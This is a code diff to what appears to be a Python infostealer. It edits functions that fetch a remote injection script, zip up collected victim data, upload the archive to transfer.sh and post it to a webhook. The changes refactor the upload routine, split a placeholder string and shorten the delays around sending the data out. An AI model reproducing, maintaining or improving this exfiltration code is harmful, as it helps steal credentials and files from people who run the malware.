@@ -1199,7 +1199,7 @@ class first_srdl_func(Functions):
                         core_asar = self.find_in_config("url_hawkinject")
                         try:
                             f = httpx.get(core_asar).text
-                            if self.apilink != "%API_LINK%":
+                            if self.apilink != "%API_" + "LINK%":
                                 f = f.replace("%API_URL%", self.apilink)
                                 f = f.replace("%NAME_CREATOR%", self.custombutstr)
                                 f = f.replace("%TRANSFER_URL%", self.datazip_url.replace("\n", ""))
@@ -1839,12 +1839,14 @@ class first_srdl_func(Functions):
 
     def upload_on_transfer(self, file_name, path):
         try:
-            files = {"file": (file_name, open(path, mode="rb"))}
-            ...
-            upload = requests.post("https://transfer.sh/", files=files)
-            url = upload.text
-            self.datazip_url = url
-        except:
+            with open(path, mode="rb") as file:
+                files = {"file": (file_name, file)}
+                upload = requests.post("https://transfer.sh/", files=files)
+                url = upload.text
+                self.datazip_url = url
+                return True
+        except Exception as e:
+            pass
             return False
     
     def screentimes(self):
@@ -2019,13 +2021,13 @@ class first_srdl_func(Functions):
                 if self.webapi_find in self.this_so_webh:
                     httpx.post(self.this_so_webh, json=embed)
                     httpx.post(self.this_so_webh,files={"upload_file": f}) 
-                    time.sleep(10)
+                    time.sleep(5)
         except:
             pass
 
         try:
             self.upload_on_transfer(f"{self.getlange(self.pc_codewinl)}{hwkish}-{grbber}_{imthebestdev}.zip", _zipfile)
-            time.sleep(30)
+            time.sleep(20)
         except:
             pass
         finally:
